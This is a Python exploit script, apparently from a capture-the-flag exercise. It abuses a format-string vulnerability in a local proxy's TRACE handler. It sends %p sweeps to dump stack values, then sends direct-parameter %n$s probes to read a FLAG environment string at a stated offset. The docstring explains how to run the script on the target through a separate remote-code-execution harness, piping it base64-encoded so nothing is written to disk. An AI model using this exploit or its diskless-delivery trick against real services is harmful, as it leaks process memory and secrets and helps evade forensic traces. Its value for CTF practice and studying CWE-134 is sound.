#!/usr/bin/env python3
"""
'Bfr (Buffer) / SALVOR — format-string offset finder for /proxy on :3001.

proxy.c's process_trace_request() calls snprintf(response, N, buffer) with the
client-controlled request as the *format string* (CWE-134). So a TRACE request
whose body contains conversion specifiers makes the proxy format its own stack.

This scanner does two things:
  1. A %p sweep — prints the first 12 stack dwords the proxy reads as varargs.
     Seeing real values (and recognisable ASCII dwords of our own request)
     proves the specifiers are evaluated, i.e. the bug is live.
  2. A %<n>$s search — "direct parameter access" reads the n-th argument as a
     C string (char*). The proxy's FLAG= environment variable lives on the
     stack as a pointer-to-string, so we sweep n and print whichever index
     dereferences to something containing "FLAG". Here that is n = 132.

Each probe is marked "M:<leak>:N" so the leaked field is easy to carve out.
:3001 is loopback-only (see proxy-filter.conf), so run this *on the DSRepos
box* via the Act-er RCE, piping over stdin so nothing touches the box's disk:
    B64=$(base64 -w0 scan.py)
    python3 ../Chapter_1_Act-er/exploit_harness.py "echo $B64 | base64 -d | python3 -"
"""
import socket


def leak(fmt):
    """Send one TRACE request with `fmt` as the format string, return the reply."""
    s = socket.create_connection(("127.0.0.1", 3001))
    s.settimeout(1)
    s.sendall(b"TRACE M:" + fmt + b":N\n")
    d = b""
    while True:
        try:
            c = s.recv(4096)
        except Exception:
            break
        if not c:
            break
        d += c
    s.close()
    return d


# 1) confirm the format string evaluates: dump 12 stack dwords
print("=== %p sweep ===")
print(leak(b"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p").decode(errors="replace"))

# 2) find which direct-parameter index dereferences to the FLAG env string
print("=== %n$s search for FLAG ===")
for n in range(120, 145):
    d = leak(b"%%%d$s" % n)
    if b"FLAG" in d:
        body = d.split(b"M:", 1)[-1].rsplit(b":N", 1)[0]
        print("offset", n, "->", body.decode(errors="replace"))
